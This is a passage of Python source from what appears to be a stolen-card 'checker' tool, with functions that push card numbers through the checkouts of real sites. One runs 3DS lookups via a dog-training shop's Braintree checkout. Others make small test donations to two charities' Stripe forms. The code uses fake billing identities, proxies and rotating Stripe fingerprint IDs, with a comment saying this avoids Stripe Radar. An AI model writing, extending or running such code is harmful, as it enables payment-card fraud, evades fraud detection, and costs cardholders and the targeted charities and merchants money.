        return "𝗘𝗿𝗿𝗼𝗿: Invalid card format (need cc|mm|yy|cvv)"
    n, mm, yy, cvc = parsed
    
    user = generate_user_agent()
    r = requests.Session()
    if proxy_dict:
        r.proxies.update(proxy_dict)
    
    try:
        clear_url = "https://southenddogtraining.co.uk/wp-json/cocart/v2/cart/clear"
        clear_resp = r.post(clear_url)
        
        headers = {
            'authority': 'southenddogtraining.co.uk',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://southenddogtraining.co.uk',
            'pragma': 'no-cache',
            'referer': 'https://southenddogtraining.co.uk/shop/cold-pressed-dog-food/cold-pressed-sample/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        json_data = {
            'id': '123368',
            'quantity': '1',
        }
        
        response = r.post(
            'https://southenddogtraining.co.uk/wp-json/cocart/v2/cart/add-item',
            headers=headers,
            json=json_data,
        )
        cart_hash = response.json()['cart_hash']
        
        cookies = {
            'clear_user_data': 'true',
            'woocommerce_items_in_cart': '1',
            'woocommerce_cart_hash': cart_hash,
            'pmpro_visit': '1',
        }
        
        headers = {
            'authority': 'southenddogtraining.co.uk',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'pragma': 'no-cache',
            'referer': 'https://southenddogtraining.co.uk/shop/cold-pressed-dog-food/cold-pressed-sample/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        response = r.get('https://southenddogtraining.co.uk/checkout/', cookies=cookies, headers=headers)
        client = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)
        add_nonce = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text).group(1)
        
        headers = {
            'authority': 'southenddogtraining.co.uk',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://southenddogtraining.co.uk',
            'pragma': 'no-cache',
            'referer': 'https://southenddogtraining.co.uk/checkout/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'action': 'wc_braintree_credit_card_get_client_token',
            'nonce': client,
        }
        
        response = r.post(
            'https://southenddogtraining.co.uk/cms/wp-admin/admin-ajax.php',
            cookies=cookies,
            headers=headers,
            data=data,
        )
        enc = response.json()['data']
        dec = base64.b64decode(enc).decode('utf-8')
        au = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)[0]
        
        headers = {
            'authority': 'payments.braintree-api.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'authorization': f'Bearer {au}',
            'braintree-version': '2018-05-10',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://southenddogtraining.co.uk',
            'pragma': 'no-cache',
            'referer': 'https://southenddogtraining.co.uk/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': '6f25ee04-0384-46dc-9413-222fa62fc552',
            },
            'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment     }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
            'operationName': 'ClientConfiguration',
        }
        
        response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
        car = response.json()['data']['clientConfiguration']['creditCard']['threeDSecure']['cardinalAuthenticationJWT']
        
        headers = {
            'authority': 'centinelapi.cardinalcommerce.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://southenddogtraining.co.uk',
            'pragma': 'no-cache',
            'referer': 'https://southenddogtraining.co.uk/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-cardinal-tid': 'Tid-9485656a-80d9-4fb0-9090-5f1a55b0d87a',
        }
        
        json_data = {
            'BrowserPayload': {
                'Order': {
                    'OrderDetails': {},
                    'Consumer': {
                        'BillingAddress': {},
                        'ShippingAddress': {},
                        'Account': {},
                    },
                    'Cart': [],
                    'Token': {},
                    'Authorization': {},
                    'Options': {},
                    'CCAExtension': {},
                },
                'SupportsAlternativePayments': {
                    'cca': True,
                    'hostedFields': False,
                    'applepay': False,
                    'discoverwallet': False,
                    'wallet': False,
                    'paypal': False,
                    'visacheckout': False,
                },
            },
            'Client': {
                'Agent': 'SongbirdJS',
                'Version': '1.35.0',
            },
            'ConsumerSessionId': '1_51ec1382-5c25-4ae8-8140-d009e9a0ba7e',
            'ServerJWT': car,
        }
        
        response = r.post('https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init', headers=headers, json=json_data)
        payload = response.json()['CardinalJWT']
        ali2 = jwt.decode(payload, options={"verify_signature": False})
        reid = ali2['ReferenceId']
        
        headers = {
            'authority': 'geo.cardinalcommerce.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://geo.cardinalcommerce.com',
            'pragma': 'no-cache',
            'referer': 'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId=685f36f8a9cda83f2eeb2dff&tmEventType=PAYMENT&referenceId=1_51ec1382-5c25-4ae8-8140-d009e9a0ba7e&geolocation=false&origin=Songbird',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        json_data = {
            'Cookies': {
                'Legacy': True,
                'LocalStorage': True,
                'SessionStorage': True,
            },
            'DeviceChannel': 'Browser',
            'Extended': {
                'Browser': {
                    'Adblock': True,
                    'AvailableJsFonts': [],
                    'DoNotTrack': 'unknown',
                    'JavaEnabled': False,
                },
                'Device': {
                    'ColorDepth': 24,
                    'Cpu': 'unknown',
                    'Platform': 'Linux armv81',
                    'TouchSupport': {
                        'MaxTouchPoints': 5,
                        'OnTouchStartAvailable': True,
                        'TouchEventCreationSuccessful': True,
                    },
                },
            },
            'Fingerprint': '1224948465f50bd65545677bc5d13675',
            'FingerprintingTime': 980,
            'FingerprintDetails': {
                'Version': '1.5.1',
            },
            'Language': 'ar-EG',
            'Latitude': None,
            'Longitude': None,
            'OrgUnitId': '685f36f8a9cda83f2eeb2dff',
            'Origin': 'Songbird',
            'Plugins': [],
            'ReferenceId': reid,
            'Referrer': 'https://southenddogtraining.co.uk/',
            'Screen': {
                'FakedResolution': False,
                'Ratio': 2.2222222222222223,
                'Resolution': '800x360',
                'UsableResolution': '800x360',
                'CCAScreenSize': '01',
            },
            'CallSignEnabled': None,
            'ThreatMetrixEnabled': False,
            'ThreatMetrixEventType': 'PAYMENT',
            'ThreatMetrixAlias': 'Default',
            'TimeOffset': -180,
            'UserAgent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'UserAgentDetails': {
                'FakedOS': False,
                'FakedBrowser': False,
            },
            'BinSessionId': '09f2dd83-a00a-42d5-9d89-f2867589860b',
        }
        
        response = r.post(
            'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData',
            cookies=r.cookies,
            headers=headers,
            json=json_data,
        )
        
        headers = {
            'authority': 'payments.braintree-api.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'authorization': f'Bearer {au}',
            'braintree-version': '2018-05-10',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'pragma': 'no-cache',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': 'd118f7da-b7b0-4b4e-847a-c81bc63dad77',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': n,
                        'expirationMonth': mm,
                        'expirationYear': yy,
                        'cvv': cvc,
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }
        
        response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
        tok = response.json()['data']['tokenizeCreditCard']['token']
        binn = response.json()['data']['tokenizeCreditCard']['creditCard']['bin']
        
        headers = {
            'authority': 'api.braintreegateway.com',
            'accept': '*/*',
            'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            'cache-control': 'no-cache',
            'content-type': 'application/json',
            'origin': 'https://southenddogtraining.co.uk',
            'pragma': 'no-cache',
            'referer': 'https://southenddogtraining.co.uk/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }
        
        json_data = {
            'amount': '2.00',
            'additionalInfo': {},
            'bin': binn,
            'dfReferenceId': reid,
            'clientMetadata': {
                'requestedThreeDSecureVersion': '2',
                'sdkVersion': 'web/3.94.0',
                'cardinalDeviceDataCollectionTimeElapsed': 51,
                'issuerDeviceDataCollectionTimeElapsed': 2812,
                'issuerDeviceDataCollectionResult': True,
            },
            'authorizationFingerprint': au,
            'braintreeLibraryVersion': 'braintree/web/3.94.0',
            '_meta': {
                'merchantAppId': 'southenddogtraining.co.uk',
                'platform': 'web',
                'sdkVersion': '3.94.0',
                'source': 'client',
                'integration': 'custom',
                'integrationType': 'custom',
                'sessionId': 'e0de4acd-a40f-46fd-9f4b-ae49eb1ff65f',
            },
        }
        
        response = r.post(
            f'https://api.braintreegateway.com/merchants/twtsckjpfh6g4qqg/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
            headers=headers,
            json=json_data,
        )
        vbv = response.json()['paymentMethod']['threeDSecureInfo']['status']
        
        if 'authenticate_successful' in vbv or 'authenticate_attempt_successful' in vbv:
            return '3DS Authenticate Attempt Successful'
        elif 'challenge_required' in vbv:
            return '3DS Challenge Required'
        else:
            return vbv
    except Exception as e:
        return f"𝗘𝗿𝗿𝗼𝗿: {str(e)[:50]}"

# ================== Stripe Charge Gateway ==================
def stripe_charge(ccx, proxy_dict=None):
    parsed = _parse_card(ccx)
    if not parsed:
        return "𝗘𝗿𝗿𝗼𝗿: Invalid card format (need cc|mm|yy|cvv)"
    c, mm, yy, cvc = parsed
    
    user = generate_user_agent()
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
    email = f"{username}@gmail.com"
    
    session = requests.Session()
    if proxy_dict:
        session.proxies.update(proxy_dict)
    
    headers = {
        'user-agent': user,
    }
    response = session.get(f'https://higherhopesdetroit.org/donation', headers=headers)
    time.sleep(2)
    
    try:
        ssa = re.search(r'name="give-form-hash" value="(.*?)"', response.text).group(1)
        ssa00 = re.search(r'name="give-form-id-prefix" value="(.*?)"', response.text).group(1)
        ss000a00 = re.search(r'name="give-form-id" value="(.*?)"', response.text).group(1)
        pk_live = re.search(r'(pk_live_[A-Za-z0-9_-]+)', response.text).group(1)
    except AttributeError:
        return "Failed to extract form data"
    
    headers = {
        'origin': f'https://higherhopesdetroit.org',
        'referer': f'https://higherhopesdetroit.org/donation',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }
    
    data = {
        'give-honeypot': '',
        'give-form-id-prefix': ssa00,
        'give-form-id': ss000a00,
        'give-form-title': 'Give a Donation',
        'give-current-url': f'https://higherhopesdetroit.org/donation',
        'give-form-url': f'https://higherhopesdetroit.org/donation',
        'give-form-minimum': f'1.00',
        'give-form-maximum': '999999.99',
        'give-form-hash': ssa,
        'give-price-id': 'custom',
        'give-amount': f'1.00',
        'give_tributes_type': 'DrGaM Of',
        'give_tributes_show_dedication': 'no',
        'give_tributes_radio_type': 'In Honor Of',
        'give_tributes_first_name': '',
        'give_tributes_last_name': '',
        'give_tributes_would_to': 'send_mail_card',
        'give-tributes-mail-card-personalized-message': '',
        'give_tributes_mail_card_notify_first_name': '',
        'give_tributes_mail_card_notify_last_name': '',
        'give_tributes_address_country': 'US',
        'give_tributes_mail_card_address_1': '',
        'give_tributes_mail_card_address_2': '',
        'give_tributes_mail_card_city': '',
        'give_tributes_address_state': 'MI',
        'give_tributes_mail_card_zipcode': '',
        'give_stripe_payment_method': '',
        'payment-mode': 'stripe',
        'give_first': 'drgam ',
        'give_last': 'drgam ',
        'give_email': 'lolipnp@gmail.com',
        'give_comment': '',
        'card_name': 'drgam ',
        'billing_country': 'US',
        'card_address': 'drgam sj',
        'card_address_2': '',
        'card_city': 'tomrr',
        'card_state': 'NY',
        'card_zip': '10090',
        'give_action': 'purchase',
        'give-gateway': 'stripe',
        'action': 'give_process_donation',
        'give_ajax': 'true',
    }
    
    response = session.post(f'https://higherhopesdetroit.org/wp-admin/admin-ajax.php', cookies=session.cookies, headers=headers, data=data)
    
    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    data = f'type=card&billing_details[name]=drgam++drgam+&billing_details[email]=lolipnp%40gmail.com&billing_details[address][line1]=drgam+sj&billing_details[address][line2]=&billing_details[address][city]=tomrr&billing_details[address][state]=NY&billing_details[address][postal_code]=10090&billing_details[address][country]=US&card[number]={c}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=d4c7a0fe-24a0-4c2f-9654-3081cfee930d03370a&muid=3b562720-d431-4fa4-b092-278d4639a6f3fd765e&sid=70a0ddd2-988f-425f-9996-372422a311c454628a&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+split-card-element&referrer=https%3A%2F%2Fhigherhopesdetroit.org&time_on_page=85758&client_attribution_metadata[client_session_id]=c0e497a5-78ba-4056-9d5d-0281586d897a&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card-element&client_attribution_metadata[merchant_integration_version]=2017&key={pk_live}&_stripe_account=acct_1C1iK1I8d9CuLOBr&radar_options'
    
    e = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
    
    try:
        e_json = e.json()
        if 'id' in e_json:
            payment_id = e_json['id']
        else:
            err = e_json.get('error', {})
            decline_code = err.get('decline_code', '')
            err_code = err.get('code', '')
            err_msg = err.get('message', 'Unknown error')
            if decline_code:
                if 'incorrect_number' in decline_code or 'invalid' in decline_code:
                    return f"Declined ❌ - Invalid Card Number"
                elif 'insufficient_funds' in decline_code:
                    return f"Insufficient Funds 💰"
                elif 'stolen' in decline_code or 'lost' in decline_code:
                    return f"Declined ❌ - Lost/Stolen Card"
                elif 'expired' in decline_code:
                    return f"Declined ❌ - Expired Card"
                else:
                    return f"Declined ❌ - {decline_code}"
            elif err_code:
                if 'incorrect_number' in err_code:
                    return f"Declined ❌ - Incorrect Card Number"
                elif 'invalid_expiry' in err_code:
                    return f"Declined ❌ - Invalid Expiry"
                elif 'invalid_cvc' in err_code:
                    return f"Declined ❌ - Invalid CVC"
                elif 'card_declined' in err_code:
                    return f"Declined ❌ - Card Declined"
                elif 'expired_card' in err_code:
                    return f"Declined ❌ - Expired Card"
                elif 'processing_error' in err_code:
                    return f"Declined ❌ - Processing Error"
                else:
                    return f"Declined ❌ - {err_code}"
            else:
                return f"Declined ❌ - {err_msg[:80]}"
    except:
        return "Declined ❌ - Failed to process card"
    
    headers = {
        'authority': f'https://higherhopesdetroit.org',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': f'https://higherhopesdetroit.org',
        'referer': f'https://higherhopesdetroit.org/donation',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    
    params = {
        'payment-mode': 'stripe',
        'form-id': ss000a00,
    }
    
    data = {
        'give-honeypot': '',
        'give-form-id-prefix': ssa00,
        'give-form-id': ss000a00,
        'give-form-title': 'Give a Donation',
        'give-current-url': f'https://higherhopesdetroit.org/donation',
        'give-form-url': f'https://higherhopesdetroit.org/donation',
        'give-form-minimum': f'1.00',
        'give-form-maximum': '999999.99',
        'give-form-hash': ssa,
        'give-price-id': 'custom',
        'give-amount': f'1.00',
        'give_tributes_type': 'In Honor Of',
        'give_tributes_show_dedication': 'no',
        'give_tributes_radio_type': 'Drgam Of',
        'give_tributes_first_name': '',
        'give_tributes_last_name': '',
        'give_tributes_would_to': 'send_mail_card',
        'give-tributes-mail-card-personalized-message': '',
        'give_tributes_mail_card_notify_first_name': '',
        'give_tributes_mail_card_notify_last_name': '',
        'give_tributes_address_country': 'US',
        'give_tributes_mail_card_address_1': '',
        'give_tributes_mail_card_address_2': '',
        'give_tributes_mail_card_city': '',
        'give_tributes_address_state': 'MI',
        'give_tributes_mail_card_zipcode': '',
        'give_stripe_payment_method': payment_id,
        'payment-mode': 'stripe',
        'give_first': 'drgam ',
        'give_last': 'drgam ',
        'give_email': 'lolipnp@gmail.com',
        'give_comment': '',
        'card_name': 'drgam ',
        'billing_country': 'US',
        'card_address': 'drgam sj',
        'card_address_2': '',
        'card_city': 'tomrr',
        'card_state': 'NY',
        'card_zip': '10090',
        'give_action': 'purchase',
        'give-gateway': 'stripe',
    }
    
    r4 = session.post(f'https://higherhopesdetroit.org/donation', params=params, cookies=session.cookies, headers=headers, data=data)
    
    if 'Your card was declined.' in r4.text:
        return 'Card Declined'
    elif 'Your card has insufficient funds.' in r4.text:
        return 'Insufficient Funds'
    elif 'Thank you' in r4.text or 'Thank you for your donation' in r4.text or 'succeeded' in r4.text or 'true' in r4.text or 'success' in r4.text or 'success":true,"data":{"status":"succeeded' in r4.text:
        return 'Charge !!'
    elif 'Your card number is incorrect.' in r4.text:
        return 'Incorrect CVV2'
    else:
        return 'Card Reject'


# ================== DrGaM Gateway (crisisaid.org.uk GiveWP + Stripe) ==================
def drgam_charge(ccx, proxy_dict=None, amount="1.00"):
    parsed = _parse_card(ccx)
    if not parsed:
        return "𝗘𝗿𝗿𝗼𝗿: Invalid card format"
    c, mm, yy, cvc = parsed

    _DR_UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
    _DR_URL_BASE = 'https://www.crisisaid.org.uk/donations/ramadan-food-parcels/?srsltid=AfmBOope4yjXmAYFRNVXuoK_lxaKyh801ZXIw-SVzgwMt2y9YZT9w4gl'
    _DR_AJAX     = 'https://crisisaid.org.uk/wp-admin/admin-ajax.php'

    session = requests.Session()
    session.verify = False
    if proxy_dict:
        session.proxies.update(proxy_dict)

    try:
        resp = session.get(_DR_URL_BASE, headers={'user-agent': _DR_UA}, timeout=20)
        time.sleep(3)

        ssa       = re.search(r'name="give-form-hash" value="(.*?)"',      resp.text).group(1)
        ssa00     = re.search(r'name="give-form-id-prefix" value="(.*?)"', resp.text).group(1)
        ss000a00  = re.search(r'name="give-form-id" value="(.*?)"',        resp.text).group(1)
        pk_live   = re.search(r'(pk_live_[A-Za-z0-9_-]+)',                 resp.text).group(1)
        _acct_m   = re.search(r'(acct_[A-Za-z0-9]+)',                      resp.text)
        stripe_acct = _acct_m.group(1) if _acct_m else 'acct_19iKvODsvgF7BEql'
    except Exception:
        return "Error: Failed to load donation page"

    common_headers = {
        'origin':             'https://crisisaid.org.uk',
        'referer':            _DR_URL_BASE,
        'sec-ch-ua':          '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile':   '?1',
        'sec-ch-ua-platform': '"Android"',
        'user-agent':         _DR_UA,
        'x-requested-with':   'XMLHttpRequest',
    }

    _FORM_BASE = {
        'give-honeypot': '',
        'give-form-id-prefix': ssa00,
        'give-form-id': ss000a00,
        'give-form-title': 'Give a Donation',
        'give-current-url': _DR_URL_BASE,
        'give-form-url': _DR_URL_BASE,
        'give-form-minimum': '1.00',
        'give-form-maximum': '999999.99',
        'give-form-hash': ssa,
        'give-price-id': 'custom',
        'give-amount': amount,
        'give_tributes_type': 'In Honor Of',
        'give_tributes_show_dedication': 'no',
        'give_tributes_radio_type': 'In Honor Of',
        'give_tributes_first_name': '',
        'give_tributes_last_name': '',
        'give_tributes_would_to': 'send_mail_card',
        'give-tributes-mail-card-personalized-message': '',
        'give_tributes_mail_card_notify_first_name': '',
        'give_tributes_mail_card_notify_last_name': '',
        'give_tributes_address_country': 'US',
        'give_tributes_mail_card_address_1': '',
        'give_tributes_mail_card_address_2': '',
        'give_tributes_mail_card_city': '',
        'give_tributes_address_state': 'MI',
        'give_tributes_mail_card_zipcode': '',
        'give_stripe_payment_method': '',
        'payment-mode': 'stripe',
        'give_first': 'drgam',
        'give_last': 'drgam',
        'give_email': 'lolipnp@gmail.com',
        'give_comment': '',
        'card_name': 'drgam',
        'billing_country': 'US',
        'card_address': 'drgam sj',
        'card_address_2': '',
        'card_city': 'tomrr',
        'card_state': 'NY',
        'card_zip': '10090',
        'give_action': 'purchase',
        'give-gateway': 'stripe',
        'action': 'give_process_donation',
        'give_ajax': 'true',
    }

    try:
        session.post(_DR_AJAX, cookies=session.cookies, headers=common_headers, data=_FORM_BASE, timeout=20)
    except Exception:
        pass

    # Random fingerprint IDs per request — reusing same IDs across cards triggers Stripe Radar
    _guid, _muid, _sid = _gen_stripe_ids()
    import uuid as _uuid
    _session_id = str(_uuid.uuid4())

    stripe_headers = _stripe_fingerprint_headers(origin='https://js.stripe.com')
    stripe_headers['authority'] = 'api.stripe.com'

    stripe_data = (
        f'type=card&billing_details[name]=drgam+drgam&billing_details[email]=lolipnp%40gmail.com'
        f'&billing_details[address][line1]=drgam+sj&billing_details[address][line2]=&billing_details[address][city]=tomrr'
        f'&billing_details[address][state]=NY&billing_details[address][postal_code]=10090&billing_details[address][country]=US'
        f'&card[number]={c}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}'
        f'&guid={_guid}&muid={_muid}'
        f'&sid={_sid}'
        f'&payment_user_agent=stripe.js%2F78c7eece1c%3B+stripe-js-v3%2F78c7eece1c%3B+split-card-element'
        f'&referrer=https%3A%2F%2Fwww.crisisaid.org.uk&time_on_page={random.randint(60000, 180000)}'
        f'&client_attribution_metadata[client_session_id]={_session_id}'
        f'&client_attribution_metadata[merchant_integration_source]=elements'
        f'&client_attribution_metadata[merchant_integration_subtype]=split-card-element'
        f'&client_attribution_metadata[merchant_integration_version]=2017'
        f'&key={pk_live}&_stripe_account={stripe_acct}'
    )

    try:
        pm_resp = session.post('https://api.stripe.com/v1/payment_methods',
                               headers=stripe_headers, data=stripe_data, timeout=20)
        pm_json = pm_resp.json()
        pm_id   = pm_json.get('id')
        if not pm_id:
            _err = pm_json.get('error', {})
            print(f"[DR] PM declined — code={_err.get('code')} decline={_err.get('decline_code')} msg={_err.get('message','')[:60]}")
            return _parse_stripe_error(_err)
    except Exception as e:
        print(f"[DR] PM exception: {str(e)[:80]}")
        return f"Error: Stripe PM failed - {str(e)[:60]}"

    # ── Final donation submit via admin-ajax (returns JSON) ────────────────────
    final_ajax_headers = {
        'origin':             'https://crisisaid.org.uk',
        'referer':            _DR_URL_BASE,
        'sec-ch-ua':          '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile':   '?1',
        'sec-ch-ua-platform': '"Android"',
        'user-agent':         _DR_UA,
        'x-requested-with':   'XMLHttpRequest',
        'content-type':       'application/x-www-form-urlencoded',
    }

    final_form = dict(_FORM_BASE)
    final_form.update({
        'give_stripe_payment_method': pm_id,
        'action':                     'give_process_donation',
        'give_ajax':                  'true',
        'give-gateway':               'stripe',
        'payment-mode':               'stripe',
    })

    try:
        r4  = session.post(_DR_AJAX, cookies=session.cookies,
                           headers=final_ajax_headers, data=final_form, timeout=25)
        txt = r4.text
